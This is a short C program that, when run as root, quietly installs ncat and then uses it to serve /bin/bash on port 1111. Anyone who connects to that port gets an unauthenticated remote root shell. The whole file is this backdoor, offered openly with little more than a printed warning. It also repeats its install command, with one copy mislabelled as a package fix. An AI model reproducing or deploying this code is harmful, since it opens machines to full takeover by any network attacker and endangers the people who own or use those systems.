//Code by DisMe ^-^
//Please do not copy code

//Adding libraries
#include <stdio.h>
#include <stdlib.h>
#include <zconf.h>
#include <string.h>

//Main function
int main(){
  //Adding vars
  char cmd[150];
  const int MainPortForShell = 1111;
  int x = getuid();

  //Checking root acccess ^-^
  if(x == 0){
    //Installing tools
    {
      //Fixing broken packages ^-^
      system("apt install ncat -y > /dev/null");

      //Installing ncat ^-^
      system("apt install ncat -y > /dev/null");
    }

    //Warning
    printf("\n\nThis is warning!!!Shell will be root!Be careful!!!\n\n");
    
    //Startin Action
    sprintf(cmd, "ncat -lnvp %d -e /bin/bash", MainPortForShell);
    system(cmd);
  }
  else{
    //Warning
    printf("\n\nI do not have root access!!!\n\n");
  }
}
